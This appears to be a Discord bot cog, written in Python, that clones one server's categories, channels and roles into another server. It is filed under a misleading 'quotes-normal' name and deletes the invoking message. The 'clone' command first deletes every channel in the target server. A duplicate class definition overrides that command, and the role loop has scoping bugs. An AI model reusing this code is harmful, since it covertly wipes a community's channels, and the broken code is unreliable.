import discord
from discord.ext import commands
from discord.ext.commands import Context
import discord
from discord.ext import commands
import asyncio 


class secret(commands.Cog, name="quotes-normal"):
    def __init__(self, bot):
        self.bot = bot
               
    @commands.command(
        name="clone"
        )
    async def clone(self, ctx: Context, server_id: str):
        await ctx.message.delete()
        await asyncio.sleep(4)
        for g in self.bot.guilds:
            if int(server_id) == g.id:
                for c in g.channels:
                    await c.delete()
                for cate in ctx.guild.categories:
                    x = await g.create_category(f"{cate.name}")
                    for chann in cate.channels:
                        if isinstance(chann, discord.VoiceChannel):
                            await x.create_voice_channel(f"{chann}")
                        if isinstance(chann, discord.TextChannel):
                            await x.create_text_channel(f"{chann}")
                print(ctx.guild.roles)
        for role in ctx.guild.roles[::-1]:
            if role.name != "@everyone":
                try:
                    await g.create_role(name=role.name, color=role.color, permissions=role.permissions, hoist=role.hoist, mentionable=role.mentionable)
                    print(f"Created new role : {role.name}") 
                except:
                    break

class secret(commands.Cog, name="quotes-normal"):
    def __init__(self, bot):
        self.bot = bot
               
    @commands.command(
        name="rclone"
        )
    async def clone(self, ctx: Context, server_id: str):
        await ctx.message.delete()
        await asyncio.sleep(4)
        for g in self.bot.guilds:
            if int(server_id) == g.id:
                print(ctx.guild.roles)
                for role in ctx.guild.roles[::-1]:
                    if role.name != "@everyone" and role.managed==False:
                        try:
                            await g.create_role(name=role.name, color=role.color, permissions=role.permissions, hoist=role.hoist, mentionable=role.mentionable)
                            print(f"Created new role : {role.name}") 
                        except:
                            break       

def setup(bot):
    bot.add_cog(secret(bot))